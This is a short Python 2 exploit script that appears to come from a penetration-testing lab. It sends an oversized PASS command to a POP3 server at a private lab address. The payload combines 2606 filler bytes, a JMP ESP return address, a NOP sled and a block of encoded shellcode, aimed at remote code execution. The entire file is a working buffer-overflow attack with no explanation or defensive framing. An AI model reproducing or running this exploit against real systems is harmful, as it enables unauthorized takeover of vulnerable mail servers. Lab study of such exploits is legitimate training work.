#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# # 5f4a358f    FFE4               JMP ESP

shellcode = ("\xdb\xdc\xd9\x74\x24\xf4\x5a\x2b\xc9\xbd\x05\x30\x92\xd7\xb1"
"\x52\x83\xc2\x04\x31\x6a\x13\x03\x6f\x23\x70\x22\x93\xab\xf6"
"\xcd\x6b\x2c\x97\x44\x8e\x1d\x97\x33\xdb\x0e\x27\x37\x89\xa2"
"\xcc\x15\x39\x30\xa0\xb1\x4e\xf1\x0f\xe4\x61\x02\x23\xd4\xe0"
"\x80\x3e\x09\xc2\xb9\xf0\x5c\x03\xfd\xed\xad\x51\x56\x79\x03"
"\x45\xd3\x37\x98\xee\xaf\xd6\x98\x13\x67\xd8\x89\x82\xf3\x83"
"\x09\x25\xd7\xbf\x03\x3d\x34\x85\xda\xb6\x8e\x71\xdd\x1e\xdf"
"\x7a\x72\x5f\xef\x88\x8a\x98\xc8\x72\xf9\xd0\x2a\x0e\xfa\x27"
"\x50\xd4\x8f\xb3\xf2\x9f\x28\x1f\x02\x73\xae\xd4\x08\x38\xa4"
"\xb2\x0c\xbf\x69\xc9\x29\x34\x8c\x1d\xb8\x0e\xab\xb9\xe0\xd5"
"\xd2\x98\x4c\xbb\xeb\xfa\x2e\x64\x4e\x71\xc2\x71\xe3\xd8\x8b"
"\xb6\xce\xe2\x4b\xd1\x59\x91\x79\x7e\xf2\x3d\x32\xf7\xdc\xba"
"\x35\x22\x98\x54\xc8\xcd\xd9\x7d\x0f\x99\x89\x15\xa6\xa2\x41"
"\xe5\x47\x77\xc5\xb5\xe7\x28\xa6\x65\x48\x99\x4e\x6f\x47\xc6"
"\x6f\x90\x8d\x6f\x05\x6b\x46\x9a\xd1\x73\x39\xf2\xe7\x73\x44"
"\xb8\x61\x95\x2c\xae\x27\x0e\xd9\x57\x62\xc4\x78\x97\xb8\xa1"
"\xbb\x13\x4f\x56\x75\xd4\x3a\x44\xe2\x14\x71\x36\xa5\x2b\xaf"
"\x5e\x29\xb9\x34\x9e\x24\xa2\xe2\xc9\x61\x14\xfb\x9f\x9f\x0f"
"\x55\xbd\x5d\xc9\x9e\x05\xba\x2a\x20\x84\x4f\x16\x06\x96\x89"
"\x97\x02\xc2\x45\xce\xdc\xbc\x23\xb8\xae\x16\xfa\x17\x79\xfe"
"\x7b\x54\xba\x78\x84\xb1\x4c\x64\x35\x6c\x09\x9b\xfa\xf8\x9d"
"\xe4\xe6\x98\x62\x3f\xa3\xa9\x28\x1d\x82\x21\xf5\xf4\x96\x2f"
"\x06\x23\xd4\x49\x85\xc1\xa5\xad\x95\xa0\xa0\xea\x11\x59\xd9"
"\x63\xf4\x5d\x4e\x83\xdd")

buffer = "A"*2606 +"\x8f\x35\x4a\x5f" +"\x90" * 16 + shellcode + "C"*(3500-2606-4-351-16)


try:
	print "\nSending evil buffer..."
	s.connect(('10.11.15.91',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could Not Connect to POP3!"
